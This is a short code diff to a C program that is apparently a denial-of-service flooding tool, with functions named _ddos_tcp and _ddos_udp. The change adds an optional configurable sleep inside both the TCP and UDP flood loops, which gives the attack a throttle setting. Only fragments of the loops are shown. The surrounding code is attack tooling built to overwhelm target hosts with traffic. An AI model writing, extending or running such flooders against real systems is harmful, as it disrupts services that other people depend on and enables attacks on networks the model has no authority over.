@@ -7,6 +7,7 @@
 //
 
 #include "ddos.h"
+#include "util.h"
 
 int64_t pc;
 char* __host;
@@ -15,6 +16,8 @@ int tcount = 0;
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
 bool __run;
+bool _dos_sleep;
+int dos_sleep;
 
 void __exit()
 {
@@ -47,6 +50,9 @@ void _ddos_tcp(char* host, int port, char* packet)
     char* buf = (char*)malloc(1024 * sizeof(buf));
     size_t _bufsize = 1024 * sizeof(buf);
     for (;;) {
+        if(_dos_sleep){
+            sleep_ms(dos_sleep);
+        }
         if (!__run) {
             shutdown(sock, 2);
             free(buf);
@@ -83,6 +89,9 @@ void _ddos_udp(char* host, int port, char* packet)
     char* buf = (char*)malloc(sizeof(char) * 1024);
     size_t bufsize = 1024 * sizeof(char);
     for (;;) {
+        if(_dos_sleep){
+            sleep_ms(dos_sleep);
+        }
         if (!__run) {
             shutdown(sock, 2);
             free(buf);
